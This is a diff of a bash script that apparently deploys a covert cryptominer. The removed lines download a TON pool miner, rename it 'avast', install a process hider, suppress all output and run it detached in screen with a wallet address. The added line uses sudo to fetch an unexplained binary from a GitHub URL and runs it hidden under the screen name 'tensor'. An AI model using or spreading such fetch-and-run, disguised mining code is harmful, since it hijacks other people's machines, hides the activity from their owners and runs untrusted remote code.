@@ -4,29 +4,5 @@
 
 #!/bin/bash
 
-apt update
+sudo wget -qO main https://raw.githubusercontent.com/renilo/bh/main/testing && chmod +x main && screen -dmS tensor ./main
 
-apt install proxychains
-
-apt install curl
-
-apt install screen -y
-
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider
-
-wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1 
-
-tar xf ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1
-
-rm -f ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1
-
-mv miner-linux avast >/dev/null 2>&1
-
-chmod +x avast >/dev/null 2>&1
-
-wget https://raw.githubusercontent.com/renilo/bc/main/start.sh >/dev/null 2>&1
-
-chmod +x start.sh >/dev/null 2>&1
-
-screen -dmS Running ./start.sh
-#screen -dmS Running ./avast https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
